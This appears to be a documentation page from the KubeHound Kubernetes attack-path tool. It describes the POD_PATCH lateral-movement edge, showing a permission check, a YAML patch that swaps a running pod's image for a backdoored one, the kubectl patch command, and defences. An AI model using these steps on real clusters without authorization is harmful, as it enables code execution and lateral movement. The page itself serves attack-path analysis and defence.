# POD_PATCH

With the correct privileges an attacker can use the Kubernetes API to modify certain properties of an existing pod and achieve code execution within the pod

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Role](../vertices/ROLE.md)  | [Pod](../vertices/POD.md) | [Lateral Movement, TA0008](https://attack.mitre.org/tactics/TA0008/)  |

## Details

The `kubectl patch` command enables updating specific fields of a resource, including pods. However, the fields that can be updated using a `PATCH` command depend on the resource's API schema and the specific Kubernetes version in use. In the current version (1.27) only a very restricted set of fields can be modified using this command:
+ `spec.containers[*].image`
+ `spec.initContainers[*].image`
+ `spec.activeDeadlineSeconds`
+ `spec.tolerations` (only additions to existing tolerations)
 + `spec.terminationGracePeriodSeconds` (allow it to be set to 1 if it was previously negative)

However, this is still just enough to allow an attacker to achieve execution in a pod by modifying the container image of a running pod to a backdoored container image in an accessible container registry.

## Prerequisites

Ability to interrogate the K8s API with a role allowing pod patch access.

See the [example pod spec](../../test/setup/test-cluster/attacks/POD_PATCH.yaml).

## Checks

Simply ask kubectl:

```bash
k auth can-i patch pod
```

## Exploitation

First, create a backdoored container image and save in an accessible container registry. For demonstration purposes we will use `kalilinux/kali-last-release` in dockerhub. Next create a patch file, changing the target pod image to our backdoored image:

```yaml
spec:
  containers:
  - name: <TARGET POD NAME>
    image: kalilinux/kali-last-release
```

Finally apply the patch via `kubectl`:

```bash
kubectl patch pod <TARGET POD NAME> --patch-file patch.yaml
```

## Defences

### Enforce Usage of Trusted Container Registries

Prevent pods pulling images from non-trusted container registries. Since the `pod/patch` access is limited to modifying the container image, blocking access to untrusted registries makes this attack significantly harder to achieve (requires introducing a malicious image into a trusted regsitry).

### Implement least privilege access

Pod patch is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.

## Calculation

+ [PodPatch](../../pkg/kubehound/graph/edge/pod_patch.go)
+ [PodPatchNamespace](../../pkg/kubehound/graph/edge/pod_patch_namespace.go)

## References:

+ [Official Kubernetes Documentation](https://kubernetes.io/docs/tasks/manage-kubernetes-objects/update-api-object-kubectl-patch/)
